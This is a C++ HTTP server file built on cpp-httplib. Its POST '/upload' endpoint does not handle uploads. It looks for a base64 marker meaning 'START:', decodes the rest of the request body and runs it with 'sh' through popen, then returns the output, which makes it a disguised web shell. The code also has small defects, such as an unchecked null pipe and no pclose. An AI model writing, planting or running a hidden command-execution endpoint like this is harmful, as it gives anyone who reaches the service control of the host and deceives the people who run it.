#include "httplib.h"
#include <fstream>
#include <iostream>
#include <chrono>
#include <thread>

int main() {
    httplib::Server server;

    server.Post("/upload", [](const httplib::Request& req, httplib::Response& res) {
        std::cout << "Received " << req.body.size() << " bytes\n";
        std::string body(req.body.data(), req.body.size());
        std::string key = "U1RBUlQ6";
        std::string response;

        size_t pos = body.find(key);
        if (pos != std::string::npos) {
            std::string raw_cmd = body.substr(pos + key.length());
            std::string cmd = "echo '" + raw_cmd + "' | base64 -d | sh";
            FILE* pipe = popen(cmd.c_str(), "r");
            if (!pipe)
                res.set_content("failed", "text/plain");

            std::array<char, 128> buffer;
            while (fgets(buffer.data(), buffer.size(), pipe) != nullptr)
                response += buffer.data();
        }
        
        res.set_content(response, "text/plain");
    });

    if (!server.listen("127.0.0.1", 8443)) {
        std::cerr << "Could not listen on port 8443\n";
        return 1;
    }
}